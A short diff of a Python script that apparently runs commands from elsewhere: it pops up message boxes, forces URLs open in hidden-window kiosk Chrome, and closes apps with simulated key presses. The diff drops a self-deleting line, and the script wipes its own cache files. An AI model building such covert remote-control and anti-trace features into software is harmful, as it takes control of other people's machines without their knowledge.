@@ -1,6 +1,5 @@
 import os
 import glob
-os.remove(__file__)
 try:
     for file in glob.glob(str(current / "__pycache__") + r"\*.pyc"):
         os.remove(file)
@@ -65,21 +64,19 @@ def execute(command):
             elif command["type"] == "warning":
                 showwarning(command["title"], command["msg"])
         elif command["exec"] == "open-url":
-            chrome_options = Options()
-            chrome_options.add_experimental_option("useAutomationExtension", False)
-            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            options = Options()
+            options.add_experimental_option("useAutomationExtension", False)
+            options.add_experimental_option("excludeSwitches", ["enable-automation"])
             if command["mode"] == "kiosk":
-                chrome_options.add_argument("--kiosk");
+                options.add_argument("--kiosk");
             if command["mode"] == "fullscreen":
-                chrome_options.add_argument("--start-fullscreen");
+                options.add_argument("--start-fullscreen");
             service = webdriver.chrome.service.Service(driver_path)
             service.creationflags = subprocess.CREATE_NO_WINDOW
-            driver = webdriver.Chrome(service=service, options=chrome_options)
+            driver = webdriver.Chrome(service=service, options=options)
             driver.get(command["url"])
-            try:
-                driver.switch_to.window(driver.window_handles[0])
-            except:
-                pass
+            while True:
+                time.sleep(60)
         elif command["exec"] == "close-app":
             con = pynput.keyboard.Controller()
             con.press(pynput.keyboard.Key.alt)
